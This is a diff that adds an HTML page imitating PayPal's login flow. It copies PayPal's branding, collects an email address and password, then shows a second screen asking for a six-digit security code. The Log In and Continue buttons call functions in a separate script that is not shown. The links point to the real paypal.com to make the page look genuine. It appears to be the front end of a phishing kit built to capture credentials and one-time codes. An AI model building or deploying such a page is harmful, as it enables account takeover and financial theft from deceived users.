@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="shortcut icon" href="paypal-favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <title>Log in to your account</title>
+</head>
+
+<body>
+    <div class="load-bg">
+        <img src="paypal-load.png" class="load-img" />
+    </div>
+    <div class="main-container">
+        <div class="logo-container">
+            <img src="paypal-logo.png" class="paypal-logo" />
+        </div>
+
+        <div class="input-container" id="emailContainer">
+            <input type="text" class="info-input" id="emailInput">
+            <div class="input-placeholder">Email address or mobile number</div>
+            <div class="focus-border"></div>
+            <div class="error-flex">
+                <img src="paypal-error.png" class="error-img" />
+                <div class="error-txt">Required.</div>
+            </div>
+            <button class="btn-toggle" onclick="togglePassword()">Show</button>
+        </div>
+        <div class="input-gaps" style="height: 16px; transition: 0.3s ease;"></div> <!--16, 28-->
+        <div class="input-container"  id="passwordContainer">
+            <input type="password" class="info-input" id="passwordInput">
+            <div class="input-placeholder">Password</div>
+            <div class="focus-border"></div>
+            <div class="eye-cover"></div>
+            <div class="error-flex">
+                <img src="paypal-error.png" class="error-img" />
+                <div class="error-txt">Password is required</div>
+            </div>
+        </div>
+        <div class="input-gaps" style="height: 0px; transition: 0.3s ease;"></div>
+
+        <a class="forgot-password" style="color: var(--forgot-txt);" href="https://www.paypal.com/authflow/entry/?country.x=GB&locale.x=en_GB&redirectUri=%252Fsignin%252F%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fverify&clientInstanceId=cb0d30e8-0168-4e70-9da4-43e351671e05&anw_sid=AAFYyQVyAQj_jnWfbaFoA3FPtNha61q2CUKKIEu3P16dspx6OoE3b2w6QNSlcXZhyHfCVSbdGyRz7kReLKyMN19s9mAVxlANBXQQbQc0mjNr5RJ3ChJFm1Y-5DEhbepYHVzJ04XkLTqQpb7GzbUrUkpqsAEOcIKmSXkyj9PfcMQy5-_X7RaLmRelaczZbXNIrQxmOBTV59JqJtzozl0xgmWeFweZ1HxisgTf5v6ROjwfSuAfHA">Forgotten password?</a>
+        <button class="btn-login" onclick="logIn()">Log In</button>
+
+        <div class="or-flex">
+            <div class="or-border"></div>
+            <div class="or-txt">or</div>
+            <div class="or-border"></div>
+        </div>
+
+        <button class="btn-signup">Sign Up</button>
+
+        <div class="lang-container">
+            <img src="paypal-arrow.png" class="lang-arrow" style="cursor: pointer;" />
+        </div>
+    </div>
+
+    <div class="verify-container">
+        <img src="paypal-verify-logo.png" class="paypal-logo-big" />
+        <div class="verify-title">Enter your code</div>
+        <div class="verify-desc">Enter the <span id="digitNum">6</span>-digit security code that was sent to you.</div>
+
+        <div class="enter-flex">
+            <input type="text" class="enter-input" />
+            <input type="text" class="enter-input" />
+            <input type="text" class="enter-input" />
+            <input type="text" class="enter-input" />
+            <input type="text" class="enter-input" />
+            <input type="text" class="enter-input" />
+
+            <div class="v-error-flex">
+                <img src="paypal-ver-error.png" class="ver-err-img" />
+                <div class="ver-err-txt">Please enter a security code.</div>
+            </div>
+        </div>
+
+        <div id="verifyErrorSpace" style="height: 0px; transition: 0.3s ease;"></div> <!-- 30px -->
+
+        <button class="btn-verify" onclick="sendCode()">Continue</button>
+        
+        <a class="having-trouble" style="color: var(--trouble-txt);" href="https://www.paypal.com/authflow/entry/?country.x=GB&locale.x=en_GB&redirectUri=%252Fsignin%252F%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fverify&clientInstanceId=cb0d30e8-0168-4e70-9da4-43e351671e05&anw_sid=AAFYyQVyAQj_jnWfbaFoA3FPtNha61q2CUKKIEu3P16dspx6OoE3b2w6QNSlcXZhyHfCVSbdGyRz7kReLKyMN19s9mAVxlANBXQQbQc0mjNr5RJ3ChJFm1Y-5DEhbepYHVzJ04XkLTqQpb7GzbUrUkpqsAEOcIKmSXkyj9PfcMQy5-_X7RaLmRelaczZbXNIrQxmOBTV59JqJtzozl0xgmWeFweZ1HxisgTf5v6ROjwfSuAfHA">Having trouble logging in?</a>
+    </div>
+
+    <div class="footer-bg">
+        <div class="footer-lnk">Contact us</div>
+        <div class="footer-lnk">Privacy</div>
+        <div class="footer-lnk">Legal</div>
+        <div class="footer-lnk">Worldwide</div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
